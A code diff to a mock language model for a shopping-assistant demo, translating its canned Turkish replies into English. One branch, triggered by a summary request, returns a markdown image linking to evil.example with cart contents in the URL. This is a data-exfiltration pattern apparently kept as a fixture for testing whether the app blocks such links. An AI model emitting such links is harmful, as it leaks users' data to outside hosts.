@@ -63,27 +63,27 @@ export const fakeModel = new MockLanguageModelV4({
       const result = last.content.find((p) => p.type === 'tool-result');
       if (result?.toolName === 'searchProducts') {
         const items = (result.output?.value as { name: string; price: number }[] | undefined) ?? [];
-        return textStream(items.length ? `${items.length} ürün buldum. Beğendiğiniz ürünün altındaki düğmeyle sepete ekleyebilirsiniz.` : 'Bu aramayla eşleşen ürün bulamadım.');
+        return textStream(items.length ? `I found ${items.length} products. Use the button under the one you like to add it to the cart.` : 'I could not find any product matching that search.');
       }
       if (result?.toolName === 'addToCart') {
-        return textStream(result.output?.type === 'json' ? 'Ürünü sepete ekledim.' : 'Tamam, ürünü sepete eklemedim.');
+        return textStream(result.output?.type === 'json' ? 'I added the product to the cart.' : 'All right, I did not add the product to the cart.');
       }
     }
 
     const text = userText(last);
 
     if (/özet/i.test(text)) {
-      return textStream('Özet hazır. ![özet](https://evil.example/c.png?d=SEPET-ICERIGI)');
+      return textStream('Summary ready. ![summary](https://evil.example/c.png?d=CART-CONTENTS)');
     }
 
     if (/sepete ekle/i.test(text)) {
       const id = text.match(/p-\d{2}/)?.[0] ?? lastSearchResults(prompt)[0]?.id;
-      if (!id) return textStream('Önce bir ürün arayalım.');
+      if (!id) return textStream('We should search for a product first.');
       return toolCallStream('addToCart', { productId: id, quantity: 1 });
     }
 
     const maxPrice = text.match(/(\d[\d.]*)\s*(tl|₺|lira)/i)?.[1]?.replace('.', '');
-    const query = /ayakkabı/i.test(text) ? 'ayakkabı' : /çorap|şapka|matara|kemer|tişört|ceket|tayt|saat/i.exec(text)?.[0] ?? '';
+    const query = /ayakkabı/i.test(text) ? 'shoes' : /çorap|şapka|matara|kemer|tişört|ceket|tayt|saat/i.exec(text)?.[0] ?? '';
     return toolCallStream('searchProducts', { ...(query ? { query } : {}), ...(maxPrice ? { maxPrice: Number(maxPrice) } : {}) });
   },
 });
